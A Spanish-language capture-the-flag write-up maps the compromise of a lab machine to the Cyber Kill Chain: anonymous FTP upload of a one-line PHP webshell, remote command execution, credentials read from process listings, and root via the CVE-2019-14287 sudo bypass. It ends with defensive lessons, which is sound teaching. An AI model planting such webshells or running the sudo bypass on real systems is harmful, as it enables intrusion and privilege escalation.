# Cyber Kill Chain — OoOps Machine

Modelo **Lockheed Martin Cyber Kill Chain** aplicado a la ruta de compromiso de este reto.  
El objetivo es documentar cada fase como si fuera un ataque real, no solo una secuencia de comandos.

---

## Las 7 fases

| Fase | Descripción general | Acción en este reto | Herramienta |
|------|--------------------|--------------------|-------------|
| **1. Reconocimiento** | El atacante recopila información sobre el objetivo | Escaneo de puertos y servicios; identificación de FTP anónimo, Apache con PHP y SSH | `nmap -sV -sC -p-` |
| **2. Armamento** | El atacante prepara el arma o técnica de ataque | Creación de webshell PHP de una línea (`<?php system($_GET["cmd"]); ?>`) | `echo`, editor de texto |
| **3. Entrega** | El atacante envía el ataque al objetivo | Subida del webshell al webroot (`/var/www/html`) mediante FTP anónimo con permisos de escritura | `ftp` (anonymous) |
| **4. Explotación** | Se aprovecha la vulnerabilidad | RCE a través del webshell vía HTTP; lectura de Flag 1; descubrimiento de credenciales en `ps aux` | `curl`, navegador |
| **5. Instalación** | El atacante establece persistencia | No aplica en este reto (CTF de lectura, no de persistencia) | — |
| **6. C2 (Command & Control)** | El atacante controla el sistema comprometido | Acceso SSH interactivo como usuario `hacker` con credenciales obtenidas de `ps aux` | `ssh hacker@<IP>` |
| **7. Acción sobre objetivos** | El atacante logra su objetivo final | Escalada a root via CVE-2019-14287 (`sudo -u#-1 /bin/bash`) y lectura de Flag 2 | `sudo`, `cat` |

---

## Diagrama de la cadena

```
[nmap] → puertos 21, 22, 80
    ↓
[ftp anonymous] → /var/www/html (drwxrwxrwx)
    ↓
[put shell.php] → webshell en el webroot
    ↓
[curl shell.php?cmd=...] → RCE como www-data
    ↓                              ↓
[cat /home/hacker/flag.txt]    [ps aux] → contraseña en claro
    ↓                              ↓
  FLAG 1                   [ssh hacker@<IP>]
                                   ↓
                          [sudo -l] → (ALL, !root) ALL
                                   ↓
                          sudo version 1.8.26 → CVE-2019-14287
                                   ↓
                          [sudo -u#-1 /bin/bash] → root
                                   ↓
                          [cat /root/flag.txt]
                                   ↓
                                 FLAG 2
```

---

## Lecciones aprendidas

1. **FTP anónimo + escritura en webroot = RCE garantizado.** Si el servicio FTP expone el directorio raíz del servidor web con permisos de escritura, cualquier atacante puede subir un webshell. Los dos errores juntos (FTP anónimo y permisos 777) crean un vector de ataque directo.

2. **Nunca pasar credenciales como argumentos de proceso.** `ps aux` es legible por todos los usuarios del sistema. Cualquier secreto pasado como argumento (`./script.sh <contraseña>`) queda expuesto al instante. Usar variables de entorno o ficheros de configuración con permisos restrictivos.

3. **Mantener sudo actualizado.** CVE-2019-14287 afecta a sudo < 1.8.28 — una vulnerabilidad de 2019 con parche disponible desde el mismo año. Un sudo sin actualizar con reglas `!root` da una falsa sensación de seguridad completamente bypasseable con `sudo -u#-1`.

4. **Un contenedor, un servicio.** Tener FTP, HTTP y SSH en el mismo contenedor multiplica la superficie de ataque. Si el FTP no existiera, no habría vector de subida de webshell. El principio de mínimo privilegio se aplica también a los servicios expuestos.

5. **La enumeración encadena los pasos.** Cada servicio reveló el siguiente eslabón: nmap → FTP → webshell → ps aux → SSH → sudo → root. En ningún momento fue necesario fuerza bruta; solo enumeración metódica.
